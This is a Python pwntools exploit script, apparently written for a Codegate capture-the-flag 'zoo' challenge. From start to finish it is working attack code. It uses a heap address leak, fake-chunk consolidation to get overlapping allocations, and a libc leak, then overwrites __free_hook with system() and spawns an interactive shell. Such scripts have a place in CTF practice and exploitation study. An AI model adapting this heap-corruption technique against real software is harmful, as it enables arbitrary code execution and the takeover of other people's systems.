#!/usr/bin/env python2

from __future__ import print_function
from pwn import *

context.update(os='linux', arch='amd64',
	# log_level='debug'
)

t = remote('localhost', 9999)
# t = remote('ch41l3ng3s.codegate.kr', '7788')

def adopt(kind, name, end=True):
	t.sendlineafter('>>', '1') # adopt
	t.sendlineafter('>>', str(kind))
	t.sendafter('>>', name + ('\n' if end else ''))

def feed(name):
	t.sendlineafter('>>', '2') # feed
	t.sendlineafter('>>', name)

def medicine(name, info, desc):
	assert len(info) <= 0x8
	assert len(desc) <= 0x78
	feed(name)
	t.sendafter('>>', info)
	t.sendafter('>>', desc)

def hospital(name):
	t.sendlineafter('>>', '5')
	t.sendlineafter('>>', name)
	t.recvuntil('[+]')
	result = t.recvline()
	return 'medicine' in result

def info(name):
	t.sendlineafter('>>', '6')
	t.sendlineafter('>>', name)

def walk(name, extras=None):
	t.sendlineafter('>>', '4')
	t.sendlineafter('>>', name)
	for e in extras or []:
		t.sendafter('>>', e)

def clean(name):
	t.sendlineafter('>>', '3') # feed
	t.sendlineafter('>>', name)

def prescribe(name, extra=0):
	for _ in range(4):
		feed(name)
	feed(name)
	for _ in range(9):
		walk(name)
		feed(name)
	for _ in range(extra):
		feed(name)

	assert hospital(name)


# Zoo User
t.sendlineafter('>>', '/bin/sh')

a0 = 'a' * 20
at = 'x'
ah = 'h'
a3 = 'a'
a4 = 'b'

adopt(1, a0, end=False)
feed(a0)
t.recvuntil(a0)
leak = t.recvuntil(' ate a food', drop=True)
heap_addr = u64(leak.ljust(8, '\x00'))
heap_base = heap_addr - 0x1b0 * 5 - 0x40 - 0x10
animal_base = heap_base + 0x40 + 0x10
buf_base = heap_addr
print(hex(heap_base))

fake_chunk_addr = animal_base + 2*0x1b0
fwd_chunk_addr = buf_base + 0x90
victim_chunk_addr = buf_base + 0x90*2 - 0x10
fake_chunk_size = victim_chunk_addr - fake_chunk_addr
adopt(1, a4)
adopt(1, (at + '\n\x00').ljust(4) + p64(fake_chunk_size | 1) + p64(fwd_chunk_addr), end=False)
adopt(1, ah)
adopt(1, a3)

feed(a3)
feed(a3)

prescribe(at, extra=6) # 9 walks
prescribe(ah)

print('free 2nd chunk ' + hex(fwd_chunk_addr))
# Free second chunk in the heap
walk(a3)
# Allocate second chunk in heap as 1st target food
medicine(at, p64(fake_chunk_addr), flat(
	p64(fake_chunk_addr).ljust(0x68), 
	p64(fake_chunk_size),
	p64(0x90)[:-1]
))
print('free 3rd chunk ' + hex(victim_chunk_addr))
# Free 3rd chunk in heap to consolidate backwards
walk(a3) # Does not turn into a free chunk

for _ in range(5):
	walk(ah)

# Consolidation means tricky number of chunks

# Search for chunks
# raw_input('Looking for ' + hex(fake_chunk_addr))
# for i in range(10):
# 	print(i)
# 	feed(a3)

for _ in range(8):
	feed(a3)

# Lands on the target
feed(a4)
# Points to the end of the chunk that this allocation was broken off of
medicine(ah, 'a', '\x00' * (0xb8 - 0x10 - 0x90 - 0x18) + p64(fake_chunk_addr + 0x90*2 + 0x10))

info(at)
t.recvuntil('Species : ')
libc_leak = t.recvuntil('\n', drop=True)
libc_addr = u64(libc_leak.ljust(8, '\x00'))

libc_base = libc_addr - 0x81bb78 + 0x457000
free_hook = libc_base + 0x00000000003c67a8
libc_system = libc_base + 0x0000000000045390
libc_binsh = libc_base + 0x7f275a018d17 - 0x7f2759e8c000

print('Libc', hex(libc_base))

# Consume last chunk in target
feed(a4)
# Create a pointer to free hook
medicine(ah, p64(free_hook - 0x18), flat(
	p64(animal_base + 0x1b0 * 3 + 0x30).ljust(8*12, '\x00'),
	p64(buf_base + 4*0x90)
))
walk(ah, extras=[
	p64(libc_system),
	p64(0) * 9 + p64(heap_base + 0x10) + p64(0) * 4,
	'\x00'
])
walk(ah)

t.interactive()

